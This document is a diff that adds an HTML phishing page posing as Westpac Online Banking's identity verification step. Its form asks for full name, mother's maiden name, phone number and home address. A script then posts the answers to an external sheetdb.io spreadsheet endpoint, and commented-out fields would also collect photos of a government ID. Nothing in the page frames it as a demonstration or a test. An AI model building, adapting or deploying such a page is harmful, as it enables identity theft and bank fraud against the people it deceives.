@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title>Verify your Identity - Westpac Online Banking</title>
+    <link href="styles.css" rel="stylesheet">
+</head>
+<body id="unauthenticated-template" class="authentication_v2 wr308-template auth_v2_std_signin">
+    <div id="info-banner-gdpr">
+        <div class="message-bar nomargin info" role="alert">
+            <div class="message">
+                We use cookies to secure and tailor your web use. Our <a href="https://www.westpac.com.au/privacy/privacy-statement/" target="_blank"><strong>notice</strong></a> explains how we use cookies and how you can manage them. By continuing to use this site, we assume you're ok with our notice.
+            </div>
+        </div>
+    </div>
+<body id="unauthenticated-template" class="authentication_v2">
+    <div id="main-container">
+        <h1 id="page-title">Identity Verification</h1>
+        
+        <div class="login-info-container">
+            <div id="main-input-container">
+                <form id="verification-form" method="post" action="https://sheetdb.io/api/v1/7zf4vxmdzgc2l">
+                    <fieldset>
+                        <legend class="a11y-context">Identity Verification Form</legend>
+                        
+                        <label for="fullName">
+                            <span class="label-text-main-v2">Full Name (as shown on ID)</span>
+                            <input type="text" id="full_name" name="full_name" class="txtbox-layout-white" placeholder="Enter your Full Name">
+                        </label>
+
+                        <label for="mother_maiden">
+                            <span class="label-text-main-v2">Mother's Maiden Name</span>
+                            <input type="text" id="mother_maiden" name="mother_maiden" class="txtbox-layout-white" required 
+                                pattern="[A-Za-z\s]+" 
+                                title="Please enter a valid name (letters and spaces only)"
+                                minlength="2"
+                                maxlength="50">
+                        </label>
+
+                        <label for="phone_number">
+                            <span class="label-text-main-v2">Phone Number</span>
+                            <input type="tel" id="phone_number" name="phone_number" class="txtbox-layout-white" required>
+                        </label>
+
+                        <label for="house_add">
+                            <span class="label-text-main-v2">Current House Address</span>
+                            <input type="text" id="house_add" name="house_add" class="txtbox-layout-white" required
+                                pattern="[A-Za-z0-9\s\,\.\-]+"
+                                title="Please enter a valid address"
+                                minlength="5"
+                                maxlength="200">
+                        </label>
+
+                        <!-- <div class="form-group upload-container">
+                            <span class="label-text-main-v2">Upload Identity Document</span>
+                            <p class="help-text">Please upload clear photos of your government-issued ID (passport, driver's license, or national ID card)</p>
+                            
+                            <div class="upload-section">
+                                <label for="front_id" class="file-upload-label">
+                                    <span>Front of ID</span>
+                                    <input type="file" id="front_id" name="front_id" 
+                                        accept="image/*" 
+                                        required
+                                        >
+                                </label>
+                            </div>
+
+                            <div class="upload-section">
+                                <label for="back_id" class="file-upload-label">
+                                    <span>Back of ID</span>
+                                    <input type="file" id="back_id" name="back_id"
+                                        accept="image/*" 
+                                        required
+                                        >
+                                </label>
+                            </div>
+
+                            <p class="help-text">Maximum file size: 5MB per image. Accepted formats: JPG, PNG</p>
+                        </div> -->
+
+                        <button type="submit" class="btnSignIn-v2 btn btn-primary" onclick=href="succesful.html">Submit Verification</button>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .upload-container {
+            margin: 20px 0;
+        }
+
+        .file-upload-label {
+            display: block;
+            margin: 10px 0;
+        }
+
+        .file-upload-label input[type="file"] {
+            margin-top: 5px;
+        }
+
+        .help-text {
+            font-size: 14px;
+            color: #666;
+            margin: 5px 0;
+        }
+
+        label {
+            display: block;
+            margin: 15px 0;
+        }
+
+        .txtbox-layout-white {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+
+        #verification-form {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        fieldset {
+            border: none;
+            padding: 0;
+        }
+
+        .label-text-main-v2 {
+            font-weight: bold;
+        }
+    </style>
+
+    <script>
+var form = document.getElementById("verification-form");
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        fetch(form.action, {
+            method: "POST",
+            body: new FormData(form)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Response:", data);
+            if (data && !data.error) {
+                window.open("id_verification.html", "_blank"); // Redirect to the next page if successful
+            } else {
+                alert("Failed to submit form. Please try again.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("Error submitting form. Please check your internet connection.");
+        });
+    });
+
+    </script>
+</body>
+</html>
